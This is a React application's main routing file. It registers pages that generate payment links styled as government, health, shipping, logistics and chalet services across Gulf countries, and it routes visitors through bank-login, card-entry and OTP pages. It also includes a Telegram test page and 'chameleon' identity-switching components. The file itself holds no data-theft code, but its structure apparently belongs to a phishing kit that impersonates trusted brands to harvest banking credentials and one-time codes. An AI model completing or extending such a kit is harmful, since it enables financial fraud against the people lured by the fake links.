import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import Services from "./pages/Services";
import CreateChaletLink from "./pages/CreateChaletLink";
import CreateShippingLink from "./pages/CreateShippingLink";
import CreatePaymentLink from "./pages/CreatePaymentLink";
import CreateInvoice from "./pages/CreateInvoice";
import InvoiceList from "./pages/InvoiceList";
import InvoiceView from "./pages/InvoiceView";
import InvoiceEdit from "./pages/InvoiceEdit";
import HealthServices from "./pages/HealthServices";
import LogisticsServices from "./pages/LogisticsServices";
import Contracts from "./pages/Contracts";
import PaymentRecipient from "./pages/PaymentRecipient";
import PaymentDetails from "./pages/PaymentDetails";
import PaymentData from "./pages/PaymentData";
import PaymentBankSelector from "./pages/PaymentBankSelector";
import PaymentCardInput from "./pages/PaymentCardInput";
import PaymentBankLogin from "./pages/PaymentBankLogin";
import PaymentCardForm from "./pages/PaymentCardForm";
import PaymentCard from "./pages/PaymentCard";
import PaymentOTPForm from "./pages/PaymentOTPForm";
import PaymentOTP from "./pages/PaymentOTP";
import PaymentReceiptPage from "./pages/PaymentReceiptPage";
import PaymentReceipt from "./pages/PaymentReceipt";
import TelegramTestPage from "./pages/TelegramTestPage";
import ChaletPayment from "./pages/ChaletPayment";
import GovernmentPayment from "./pages/GovernmentPayment";
import HealthPayment from "./pages/HealthPayment";
import LocalPaymentPage from "./pages/LocalPaymentPage";
import ContractPaymentPage from "./pages/ContractPaymentPage";
import DynamicIdentityDemo from "./pages/DynamicIdentityDemo";
import DynamicIdentityTest from "./pages/DynamicIdentityTest";
import SaddadRecipientPage from "./pages/SaddadRecipientPage";
import GovernmentPaymentLinkCreator from "./pages/GovernmentPaymentLinkCreator";
import CreateHealthPaymentLink from "./pages/CreateHealthPaymentLink";
import CreateLogisticsPaymentLink from "./pages/CreateLogisticsPaymentLink";
import CreateContractPaymentLink from "./pages/CreateContractPaymentLink";
import NotFound from "./pages/NotFound";
import { AutoIdentityProvider } from "./hooks/useAutoIdentityApplication";
import ErrorBoundary from "./components/ErrorBoundary";
import GCCChameleonInjector from "./components/GCCChameleonInjector";
import { useEffect } from "react";
import { useNavigate, useParams, useSearchParams } from "react-router-dom";

// Redirect component for /r/ links → payment flow
const PaymentLinkRedirect = () => {
  const { country, type, id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();

  useEffect(() => {
    const company = searchParams.get("company") || "";
    const d = searchParams.get("d");
    let decodedData: any = null;
    if (d) {
      try {
        decodedData = JSON.parse(atob(d));
      } catch (e) {}
    }

    const targetCompany = decodedData?.company || company || "";
    const targetAmount = decodedData?.amount || "";
    const targetCurrency = decodedData?.currency || "";
    const targetPaymentMethod = decodedData?.paymentMethod || "";

    // Build query params
    const params = new URLSearchParams();
    if (targetCompany) params.set("company", targetCompany);
    if (targetAmount) params.set("amount", String(targetAmount));
    if (targetCurrency) params.set("currency", targetCurrency);
    if (targetPaymentMethod) params.set("method", targetPaymentMethod);
    params.set("country", country || "");

    // Redirect to payment recipient
    navigate(`/pay/${id}?${params.toString()}`, { replace: true });
  }, [country, type, id, searchParams, navigate]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-slate-50" dir="rtl">
      <div className="text-center space-y-4">
        <div className="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center mx-auto">
          <div className="w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin" />
        </div>
        <p className="text-slate-500 font-bold">جاري التحويل...</p>
        <p className="text-slate-400 text-sm">Redirecting to payment...</p>
      </div>
    </div>
  );
};

const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      retry: 1,
      refetchOnWindowFocus: false,
      staleTime: 5 * 60 * 1000,
    },
  },
});

const App = () => (
  <ErrorBoundary>
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Sonner />
        <BrowserRouter>
          <AutoIdentityProvider>
            <GCCChameleonInjector>
            <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/services" element={<Services />} />
          <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
          <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
          <Route path="/create/:country/payment" element={<CreatePaymentLink />} />
          {/* Government Payment Services */}
          <Route path="/create/:country/government/:serviceKey" element={<GovernmentPaymentLinkCreator />} />
          {/* Health Payment Services */}
          <Route path="/create/:country/health-payment" element={<CreateHealthPaymentLink />} />
          {/* Logistics Payment Services */}
          <Route path="/create/:country/logistics-payment" element={<CreateLogisticsPaymentLink />} />
          {/* Contract Payment Services */}
          <Route path="/create/:country/contract-payment" element={<CreateContractPaymentLink />} />
          <Route path="/invoices/create/:country" element={<CreateInvoice />} />
          <Route path="/invoices/list/:country" element={<InvoiceList />} />
          <Route path="/invoices/:id/view" element={<InvoiceView />} />
          <Route path="/invoices/:id/edit" element={<InvoiceEdit />} />
          <Route path="/health/:country" element={<HealthServices />} />
          <Route path="/logistics/:country" element={<LogisticsServices />} />
          <Route path="/contracts/:country" element={<Contracts />} />
          {/* Payment link redirect: /r/:country/:type/:id → /pay/:id */}
          <Route path="/r/:country/:type/:id" element={<PaymentLinkRedirect />} />
          {/* Short URL support: /p/:id with path parameters */}
          <Route path="/p/:id/:company/:currency/:amount" element={<PaymentRecipient />} />
          <Route path="/p/:id" element={<PaymentRecipient />} />
          {/* Main payment entry point */}
          <Route path="/pay/:id" element={<PaymentRecipient />} />
          <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
          <Route path="/pay/:id/data" element={<PaymentData />} />
          <Route path="/pay/:id/details" element={<PaymentDetails />} />
          {/* New payment flow: High-fidelity components */}
          <Route path="/pay/:id/bank" element={<PaymentBankSelector />} />
          <Route path="/pay/:id/card" element={<PaymentCardInput />} />
          <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
          <Route path="/pay/:id/otp" element={<PaymentOTP />} />
          {/* Support for flow with paymentId */}
          <Route path="/pay/:id/card/:paymentId" element={<PaymentCard />} />
          <Route path="/pay/:id/otp/:paymentId" element={<PaymentOTP />} />
          <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
          <Route path="/telegram-test" element={<TelegramTestPage />} />
          {/* Dynamic Identity Pages */}
          <Route path="/dynamic-identity" element={<DynamicIdentityDemo />} />
          <Route path="/dynamic-identity-test" element={<DynamicIdentityTest />} />
          <Route path="/chalet-payment" element={<ChaletPayment />} />
          <Route path="/government-payment" element={<GovernmentPayment />} />
          <Route path="/health-payment" element={<HealthPayment />} />
          <Route path="/local-payment" element={<LocalPaymentPage />} />
          <Route path="/contract-payment" element={<ContractPaymentPage />} />
          <Route path="*" element={<NotFound />} />
          </Routes>
            </GCCChameleonInjector>
          </AutoIdentityProvider>
        </BrowserRouter>
      </TooltipProvider>
    </QueryClientProvider>
  </ErrorBoundary>
);

export default App;
